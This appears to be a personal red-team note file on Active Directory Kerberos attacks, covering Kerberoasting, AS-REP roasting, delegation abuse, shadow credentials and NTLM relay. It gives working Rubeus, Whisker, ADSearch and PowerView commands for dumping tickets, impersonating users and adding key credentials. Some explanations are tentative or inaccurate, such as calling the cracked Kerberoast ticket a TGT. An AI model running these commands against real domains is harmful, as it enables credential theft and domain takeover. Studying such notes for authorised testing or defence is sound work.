# Kerberoasting
- [[Impacket]]
- [[Rubeus]] (Windows)
- [[Hashcat]]
- [[PowerView]]

We can use GetUserSPNs from Impacket to get a TGT to crack with hashcat's mode 13100. Rubeus can be used for the same purpose from Windows. Both can be cracked with Hashcat -m 13100. Kerberoasting can also be performed across different domain with cross-domain trusts. This is especially useful for gaining access across an enterprise or gathering passwords that are not vulnerable in the current domain. 

# AS-REP Roasting
- [[Impacket]]
- [[Rubeus]]
AS-REP Roasting is possible if Kerberos pre-authentication is not enforced on user accounts. This is most likely enabled on Linux servers hosting services where Kerberos is not the ideal authentication solution, and disabling pre-auth greases the wheels significantly. 

# Unconstrained Delegation
Unconstrained delegation refers to the privilege afforded a service that is trusted to authenticate any other user to a service. This means that it retains the user's TGT in memory and is allowed in the AD privilege schema to impersonate them over the network. This is mostly bad because of the potential for ticket theft. 
```powershell
.\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname # Return a list of computers trusted for unconstrained delegation
```

```powershell
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:<ticket ID> /nowrap
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<domain> /username:<username> /password:<password> /ticket:<Base64 ticket> # Impersonate the user with their ticket using your credentials
```

# Constrained Delegation
Constrained delegation only allows a computer to authenticate users to another specific service. 
- [[Mimikatz]]
- [[PowerView]]
- [[Kekeo]]
- [[BloodHound]]
- [[Rubeus]]

## Alternate Service Names
Kerberos does not validate the SPN that the ticket is being used to authenticate to, only the account name of the machine, which does not change between services. Using this, we can gain access to other services using one computer account name. 
```powershell
.\Rubeus.exe s4u /impersonateuser:<username> /msdsspn:<spn> /altservice:<service to authenticate to> /user:<computer account name> /ticket:<ticket> /nowrap
```

# Resource-Based Constrained Delegation (RBCD)
The two major prerequisites to pull off the attack are:
1. A target computer on which you can modify msDS-AllowedToActOnBehalfOfOtherIdentity.
2. Control of another principal that has an SPN.
```powershell
powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" } # Query domain for all computers that match the above criteria
```

# Shadow Credentials
Shadow credentials refers to the use of PKINIT for authentication. This is necessry for passwordless logins using smart cards or similar (i think). 
- [[Whisker]]
```powershell
Whisker.exe list /target:<domain controller (or computer?)> # Check for pre-existing credentials
Whisker.exe add /target:<DC or computer?> # Add a new credential
# Rubeus will provide an asktgt command for you to use here.
Whisker.exe clear # Clear all credentials (dangerous!)
Whisker.exe remove /target:<DC or computer?> /deviceid:<device ID from list> # Remove only one credential (safer)
```

Whisker can abuse both the Certificate Trust and Key Trust models of shadow credentials. This attack requires write access to the owner's domain object's `msDS-KeyCredentialLink` attribute. 

# NetNTLMv2 Relay Attack
Impossible with SMB and LDAP signing enabled. Allows MITMing of NetNTLMv2 authentication. This requires sufficient control or manipulation to coerce an authentication attempt to your spoofed service or server. NTLMRelayX can capture the data to be re-used to authenticate as the user authenticating to your relay server. Further, if this server is not running inside the environment. 
- [[Impacket]]
